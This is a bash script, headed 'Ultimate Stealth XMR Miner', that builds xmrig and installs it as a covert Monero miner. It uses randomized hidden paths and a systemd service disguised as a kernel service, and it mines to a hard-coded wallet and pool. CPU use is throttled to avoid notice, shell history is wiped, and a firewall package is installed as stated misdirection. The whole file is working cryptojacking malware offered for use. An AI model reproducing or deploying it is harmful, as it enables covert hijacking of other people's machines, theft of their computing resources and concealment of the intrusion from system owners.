#!/bin/bash

# Ultimate Stealth XMR Miner with Random Worker Name
# Version 3.1 - Auto-configuring with maximum stealth

# 1. CONFIGURATION (Edit only the wallet address)
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"  # REPLACE WITH YOUR MONERO WALLET

# 2. Generate random worker name (adjective-noun-number format)
WORKER=$(shuf -n 1 <<< "silent hidden stealthy quiet covert masked private secure encrypted anonymous")-$(shuf -n 1 <<< "node worker miner process daemon service kernel system")-$((RANDOM % 1000))

echo "🔧 Initializing system optimization procedures..."

# 3. Random delay (1-45 minutes)
RAND_DELAY=$((RANDOM % 1 + 1))
echo "⏳ Scheduled maintenance in $((RAND_DELAY / 1)) minutes..."
sleep $RAND_DELAY

# 4. Silent system preparation
echo -n "⚙️  Preparing environment..."
{
sudo apt-get update -qq
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y \
    git build-essential cmake \
    libuv1-dev libssl-dev libhwloc-dev
} > /dev/null 2>&1
echo " done."

# 5. Clone and build with advanced obfuscation
RAND_DIR="/tmp/.cache-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
echo -n "⚙️  Downloading components..."
git clone -q https://github.com/xmrig/xmrig.git "$RAND_DIR" --depth 1 > /dev/null 2>&1
cd "$RAND_DIR" || exit

echo -n "⚙️  Compiling..."
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF > /dev/null 2>&1
make -j$(($(nproc)-1)) > /dev/null 2>&1
echo " done."

# 6. Stealth installation
RAND_BIN="k$(head /dev/urandom | tr -dc 0-9 | head -c 3)"
INSTALL_DIR="/usr/local/share/$(head /dev/urandom | tr -dc a-z | head -c 6)"

echo -n "⚙️  Deploying service..."
sudo mkdir -p "$INSTALL_DIR"
sudo mv ./xmrig "$INSTALL_DIR/$RAND_BIN"
sudo chmod +x "$INSTALL_DIR/$RAND_BIN"

# 7. Dynamic systemd service configuration
RAND_SERVICE="sysd-$(head /dev/urandom | tr -dc a-z | head -c 4)"
POOLS=(
    "pool.supportxmr.com:443"
)
SELECTED_POOL=${POOLS[$RANDOM % ${#POOLS[@]}]}

sudo tee "/etc/systemd/system/$RAND_SERVICE.service" > /dev/null <<EOF
[Unit]
Description=System Dynamic Kernel Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=$INSTALL_DIR/$RAND_BIN \\
    -o $SELECTED_POOL \\
    -u $WALLET \\
    -p $WORKER \\
    --tls \\
    --cpu-max-threads-hint=$((RANDOM % 25 + 40)) \\
    --randomx-mode=auto \\
    --donate-level=1 \\
    --no-color \\
    --background \\
    --randomx-init=$((RANDOM % 3 + 1)) \\
    --max-cpu-usage=$((RANDOM % 20 + 60)) \\
    --cpu-priority=4 \\
    --quiet
Restart=always
RestartSec=$((RANDOM % 30 + 30))
Nice=19
CPUSchedulingPolicy=idle
CPUWeight=$((RANDOM % 5 + 5))
MemoryHigh=350M
IOWeight=$((RANDOM % 5 + 5))

[Install]
WantedBy=multi-user.target
EOF

# 8. Enable service with random delay
sudo systemctl daemon-reload > /dev/null 2>&1
sleep $((RANDOM % 10 + 5))
sudo systemctl enable "$RAND_SERVICE" > /dev/null 2>&1
sleep $((RANDOM % 10 + 5))
sudo systemctl start "$RAND_SERVICE" > /dev/null 2>&1

# 9. Advanced cleanup
rm -rf "$RAND_DIR"
history -c
cat /dev/null > ~/.bash_history

# 10. Install security packages as misdirection
DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y ufw > /dev/null 2>&1

echo -e "\n✅ System optimization complete"
echo -e "🔧 Worker Name: \033[1m$WORKER\033[0m"
echo -e "🔍 Status: \033[1msudo systemctl status $RAND_SERVICE\033[0m"
echo -e "📊 Monitoring: \033[1mps aux | grep $RAND_BIN | grep -v grep\033[0m"
echo -e "🛑 Stop: \033[1msudo systemctl stop $RAND_SERVICE\033[0m"
